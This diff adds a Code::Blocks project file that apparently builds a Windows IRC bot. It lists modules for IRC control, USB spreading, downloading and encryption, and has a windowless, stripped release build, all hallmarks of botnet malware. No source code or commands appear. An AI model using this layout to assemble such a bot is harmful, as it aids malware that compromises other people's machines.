@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<CodeBlocks_project_file>
+	<FileVersion major="1" minor="6" />
+	<Project>
+		<Option title="tiny_bot_core" />
+		<Option platforms="Windows;" />
+		<Option compiler="gcc" />
+		<Build>
+			<Target title="debug">
+				<Option platforms="Windows;" />
+				<Option output="bin\dbg\tiny_bot_core" prefix_auto="1" extension_auto="1" />
+				<Option object_output="bin\obj\dbg\" />
+				<Option type="1" />
+				<Option compiler="gcc" />
+				<Compiler>
+					<Add option="-W" />
+					<Add option="-pg" />
+					<Add option="-g" />
+				</Compiler>
+				<Linker>
+					<Add option="-pg -lgmon" />
+					<Add library="C:\Dev-Cpp\lib\libws2_32.a" />
+				</Linker>
+			</Target>
+			<Target title="release">
+				<Option platforms="Windows;" />
+				<Option output="bin\nameless" prefix_auto="1" extension_auto="1" />
+				<Option object_output="bin\obj\rls\" />
+				<Option type="0" />
+				<Option compiler="gcc" />
+				<Compiler>
+					<Add option="-O2" />
+				</Compiler>
+				<Linker>
+					<Add option="-s" />
+				</Linker>
+			</Target>
+		</Build>
+		<Linker>
+			<Add option="-l wininet" />
+			<Add library="..\..\..\..\Program Files\CodeBlocks\MinGW\lib\libshlwapi.a" />
+			<Add library="..\..\..\..\Program Files\CodeBlocks\MinGW\lib\libws2_32.a" />
+		</Linker>
+		<Unit filename="apis.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="apis.h" />
+		<Unit filename="cfg.h" />
+		<Unit filename="cryptn.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="global.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="global.h" />
+		<Unit filename="irc.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="main.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="usb+.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="util.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="wget.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Extensions>
+			<code_completion />
+			<debugger>
+				<search_path add="C:\Documents and Settings\NiCk\Desktop\nameless bot\" />
+			</debugger>
+			<envvars />
+		</Extensions>
+	</Project>
+</CodeBlocks_project_file>
